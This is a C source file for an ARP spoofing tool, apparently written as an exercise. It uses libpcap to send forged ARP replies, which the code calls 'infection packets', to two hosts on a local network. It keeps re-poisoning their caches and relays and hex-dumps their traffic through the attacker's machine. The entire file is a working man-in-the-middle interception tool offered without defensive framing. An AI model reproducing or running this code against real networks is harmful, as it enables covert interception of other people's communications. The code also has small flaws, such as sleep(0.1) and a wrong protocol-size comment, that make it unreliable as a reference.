#include "arp_spoof.h"

void getMacFromIp(unsigned char *mac, unsigned char* ip,pcap_t * handle, char *dev, u_char *myMAC, u_char *myIP);
void makeRequestPacket(unsigned char *packet, char *interface, unsigned char *sender_ip);
void makeInfectPacket(unsigned char* packet, char* interface, unsigned char *victim_ip, unsigned char *victim_mac, unsigned char *fake_ip);
void updatePacketinfo(struct packetinfo* pinfo, const unsigned char *packet);
void printPacket(unsigned char* packet,int len);
void getMyMac(unsigned char MAC_str[ETH_ALEN], char* interface);
void getMyIP(unsigned char IP_ADDR[4], char* dev);
void writeArpHeaderFrame(unsigned char* packet,int opcode);
int checkRightPacket(unsigned char* packet, unsigned char* smac, unsigned char* dmac);
void printARPinfo(struct packetinfo *pinfo);
char *cvrtMacToStr(unsigned char *addr, char *dest);


int main(int argc, char *argv[])
{
    pcap_t *handle;
    unsigned char senderMAC[ETH_ALEN],targetMAC[ETH_ALEN],senderIP[4],targetIP[4],myMAC[ETH_ALEN],myIP[4];
    const unsigned char *recievePacket;
    char dev[10],errbuf[PCAP_ERRBUF_SIZE];
    int retValue;
    struct pcap_pkthdr *header;

    // Check argc,argv and input variables
    if (argc !=4){
        puts("usage : arp_spoof [interface] [sender ip] [target ip]");
        return 0;
    }
    strcpy(dev,argv[1]);
    inet_pton(AF_INET,argv[2],senderIP);
    inet_pton(AF_INET,argv[3],targetIP);
    getMyMac(myMAC,dev);
    getMyIP(myIP,dev);

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
    }

    // Get sender mac
    getMacFromIp(senderMAC,senderIP,handle,dev,myMAC,myIP);
    // Get target mac
    getMacFromIp(targetMAC,targetIP,handle,dev,myMAC,myIP);

    // Make Infection packet to sender
    unsigned char infectPacketToSender[60]={0,},infectPacketToTarget[60]={0,};
    makeInfectPacket(infectPacketToSender,dev,senderIP,senderMAC,targetIP);
    makeInfectPacket(infectPacketToTarget,dev,targetIP,targetMAC,senderIP);

    // First Infection
    if(pcap_sendpacket(handle,(const unsigned char*)infectPacketToSender,sizeof(infectPacketToSender)) != 0){
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
    }
    if(pcap_sendpacket(handle,(const unsigned char*)infectPacketToTarget,sizeof(infectPacketToTarget)) != 0){
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
    }

    // Do arp_spoof
    while(1)
    {
        retValue = pcap_next_ex(handle, &header, &recievePacket);
        if( retValue < 0){
            puts("Error grabbing packet\n");
            break;
        }
        if( retValue == 0 )
            continue;
        else
        {
            struct packetinfo pinfo;
            updatePacketinfo(&pinfo,recievePacket);

            // sender's arp update catcher
            if( !memcmp(pinfo.eth_sha,senderMAC,ETH_ALEN) && pinfo.eth_proto == ETHERTYPE_ARP && \
                    !memcmp(pinfo.ar_tip,targetIP,4))
            {
                //                puts("Get sender's update");
                sleep(0.1);
                if(pcap_sendpacket(handle,(const unsigned char*)infectPacketToSender,sizeof(infectPacketToSender)) != 0){
                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
                }
            }

            // target's arp update catcher
            if( !memcmp(pinfo.eth_sha,targetMAC,ETH_ALEN) && pinfo.eth_proto == ETHERTYPE_ARP && \
                    !memcmp(pinfo.ar_tip,senderIP,4))
            {
                //                puts("Get target's update");
                sleep(0.1);
                if(pcap_sendpacket(handle,(const unsigned char*)infectPacketToTarget,sizeof(infectPacketToTarget)) != 0){
                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
                }
            }

            // spoof original packet (relay packet)
            else if( !memcmp(pinfo.eth_sha,senderMAC,ETH_ALEN) && !memcmp(pinfo.eth_dha,myMAC,ETH_ALEN) ){
                //                puts("Sender to Attacker");
                unsigned char* spfPacket = (unsigned char*)malloc(sizeof(unsigned char)*header->len);
                struct ether_header* spfHead = (struct ether_header *)spfPacket;
                memcpy(spfPacket,recievePacket,header->len);
                memcpy(spfHead->ether_shost,myMAC,ETH_ALEN);
                memcpy(spfHead->ether_dhost,targetMAC,ETH_ALEN);
                if(pcap_sendpacket(handle,(const unsigned char*)spfPacket,header->len) != 0){
                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
                }
                if(pinfo.eth_proto == ETHERTYPE_IP)
                    printPacket((u_char*)recievePacket,header->len);
                free(spfPacket);
            }

            // give sender reply packet (relay packet)
            else if( !memcmp(pinfo.eth_sha,targetMAC,ETH_ALEN) && !memcmp(pinfo.eth_dha,myMAC,ETH_ALEN) ){
                //                puts("Attacker to Target");
                unsigned char* spfPacket = (unsigned char*)malloc(sizeof(unsigned char)*header->len);
                struct ether_header* spfHead = (struct ether_header *)spfPacket;
                memcpy(spfPacket,recievePacket,header->len);
                memcpy(spfHead->ether_shost,myMAC,ETH_ALEN);
                memcpy(spfHead->ether_dhost,senderMAC,ETH_ALEN);
                if(pcap_sendpacket(handle,(const unsigned char*)spfPacket,header->len) != 0){
                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
                }
                free(spfPacket);
            }

//            else{
//                puts("-------Else packet-------");
//                printPacket((u_char*)recievePacket,header->len);
//            }

        }
    }
    return 0;
}

void getMacFromIp(unsigned char *mac, unsigned char *ip, pcap_t * handle, char* dev, u_char* myMAC, u_char* myIP)
{
    const unsigned char *recievePacket;
    struct pcap_pkthdr *header;
    u_char packet[42]={0,};
    int retValue;

    // Make request packet
    makeRequestPacket(packet,dev,ip);

    // Get MAC
    while(1)
    {
        if(pcap_sendpacket(handle,(const unsigned char*)packet,sizeof(packet)) != 0){
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
            continue;
        }
        retValue = pcap_next_ex(handle, &header, &recievePacket);
        if( retValue < 0){
            puts("Error grabbing packet\n");
            break;
        }
        if( retValue == 0 ){
            continue;
        }
        else
        {
            struct packetinfo pinfo;
            updatePacketinfo(&pinfo,recievePacket);
            if( !memcmp(pinfo.ar_sip,ip,4) && !memcmp(pinfo.ar_tip,myIP,4) && \
                    pinfo.ar_op == ARPOP_REPLY && !memcmp(pinfo.ar_tha,myMAC,ETH_ALEN))
            {
                memcpy(mac,pinfo.ar_sha,ETH_ALEN);
                break;
            }
        }
    }
}



/* -----ETHER-------
 * Destination MAC  : [Broadcast]
 * Source MAC   : myMAC
 * ------ARP-------
 * Sender MAC   : myMAC
 * Sender IP    : myIP
 * Target MAC   : [Empty]
 * Target IP    : [sender ip]
 */
void makeRequestPacket(unsigned char* packet,char* interface,unsigned char* sender_ip)
{
    int offset=0;
    unsigned char myMAC[ETH_ALEN],myIP[4];
    getMyMac(myMAC,interface);
    getMyIP(myIP,interface);

    // Writing part

    // ETHERNET header
    struct ether_header *ethhdr=(struct ether_header*)packet;
    memcpy(ethhdr->ether_dhost,"\xFF\xFF\xFF\xFF\xFF\xFF",ETH_ALEN);
    memcpy(ethhdr->ether_shost,myMAC,ETH_ALEN);
    ethhdr->ether_type=htons(ETH_P_ARP);
    offset+=ETH_HLEN;
    // ARP header
    writeArpHeaderFrame(packet+offset,ARPOP_REQUEST);
    offset+=sizeof(struct arphdr);
    struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+offset);
    memcpy(arpb->ar_sha,myMAC,ETH_ALEN);
    memcpy(arpb->ar_sip,myIP,4);
    memcpy(arpb->ar_tha,"\x00\x00\x00\x00\x00\x00",ETH_ALEN);
    memcpy(arpb->ar_tip,sender_ip,4);

}

/* -----ETHER-------
 * Destination MAC  : [sender mac]
 * Source MAC   : myMAC
 * ------ARP-------
 * Sender MAC   : myMAC
 * Sender IP    : [target ip]
 * Target MAC   : [sender mac]
 * Target IP    : [sender ip]
 */
void makeInfectPacket(unsigned char* packet, char* interface, unsigned char* victim_ip, unsigned char* victim_mac, unsigned char* fake_ip)
{
    int offset=0;
    unsigned char myMAC[ETH_ALEN];
    getMyMac(myMAC,interface);

    // Writing part

    // ETHERNET header
    struct ether_header *ethhdr=(struct ether_header*)packet;
    memcpy(ethhdr->ether_dhost,victim_mac,ETH_ALEN);
    memcpy(ethhdr->ether_shost,myMAC,ETH_ALEN);
    ethhdr->ether_type=htons(ETH_P_ARP);
    offset+=ETH_HLEN;
    // ARP header
    writeArpHeaderFrame(packet+offset,ARPOP_REPLY);
    offset+=sizeof(struct arphdr);
    struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+offset);
    memcpy(arpb->ar_sha,myMAC,ETH_ALEN);
    memcpy(arpb->ar_sip,fake_ip,4);
    memcpy(arpb->ar_tha,victim_mac,ETH_ALEN);
    memcpy(arpb->ar_tip,victim_ip,4);

}

void updatePacketinfo(struct packetinfo* pinfo, const unsigned char* packet){
    memcpy(pinfo,packet,ETH_HLEN);
    pinfo->eth_proto=htons(pinfo->eth_proto);
    if( pinfo->eth_proto != ETHERTYPE_ARP )
        return;
    struct arphdr* arph = (struct arphdr*)(packet+ETH_HLEN);
    pinfo->ar_op=htons(arph->ar_op);
    struct arphdr_bot* arpb = (struct arphdr_bot*)(packet+ETH_HLEN+sizeof(struct arphdr));
    memcpy(pinfo->ar_sha,arpb->ar_sha,ETH_ALEN);
    memcpy(pinfo->ar_sip,arpb->ar_sip,4);
    memcpy(pinfo->ar_tha,arpb->ar_tha,ETH_ALEN);
    memcpy(pinfo->ar_tip,arpb->ar_tip,4);
}

char *cvrtMacToStr(unsigned char* addr, char *dest){
    sprintf(dest, "%02X:%02X:%02X:%02X:%02X:%02X", addr[0],addr[1], addr[2], addr[3], addr[4], addr[5]);
    return dest;
}

void printARPinfo(struct packetinfo* pinfo)
{
    char buf[20];
    printf("ETH SRC MAC : %s\n",cvrtMacToStr(pinfo->eth_sha,buf));
    printf("ETH DST MAC : %s\n",cvrtMacToStr(pinfo->eth_dha,buf));
    printf("ETH PROTOCO : 0x%04x\n",pinfo->eth_proto);
    if( pinfo->eth_proto != ETHERTYPE_ARP )
        return;
    printf("ARP SND MAC : %s\n",cvrtMacToStr(pinfo->ar_sha,buf));
    printf("ARP SND IP  : %s\n",inet_ntoa(*((struct in_addr*)(&pinfo->ar_sip))));
    printf("ARP TGT MAC : %s\n",cvrtMacToStr(pinfo->ar_tha,buf));
    printf("ARP TGT IP  : %s\n",inet_ntoa(*((struct in_addr*)(&pinfo->ar_tip))));
}

/* ARP header frame
 * Hardware type : Ethernet(1)  Protocol type : IPv4(0x0800)
 * Hardware size : size of mac(6) Protocol size : size of ip (6)
 * Opcode : (input value)
 */
void writeArpHeaderFrame(unsigned char* packet,int opcode)
{
    struct arphdr* arph = (struct arphdr*)packet;
    arph->ar_hrd=htons(ARPHRD_ETHER);
    arph->ar_pro=htons(ETHERTYPE_IP);
    arph->ar_hln=0x06;
    arph->ar_pln=0x04;
    arph->ar_op=htons(opcode);
}

void getMyMac(unsigned char MAC_ADDR[ETH_ALEN], char* interface)
{
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<ETH_ALEN; i++)
        MAC_ADDR[i]=(unsigned char)ifr.ifr_hwaddr.sa_data[i];
}

void getMyIP(unsigned char IP_ADDR[4], char* dev)
{
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    memcpy(IP_ADDR,&(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr),4);
}

void printPacket(unsigned char* packet,int len)
{
    int i;
    for ( i=0; i < len ; i++ ){
        if (i%16 ==0 && i != 0){
            printf("  ");
            for ( int j=-16;j<=-1;j++ ){
                if (j == -8)
                    printf("  ");
                if (isprint(*(packet+i+j)))
                    printf("%c", *(packet+i+j));
                else
                    printf(".");
            }
            printf("\n");
        }
        if ( i % 8 ==0 )
            printf ("  ");
        printf("%02x ", *(packet+i));
    }
    for(i=0;i<16-(len%16);i++){
        printf("   ");
        if ( i % 8 ==0 )
            printf ("  ");
    }
    for ( int i=(len/16)*16;i<len;i++ ){
        if (i%8 == 0 && i%16 != 0)
            printf("  ");
        if (isprint(*(packet+i)))
            printf("%c", *(packet+i));
        else
            printf(".");
    }
    printf("\n");
}
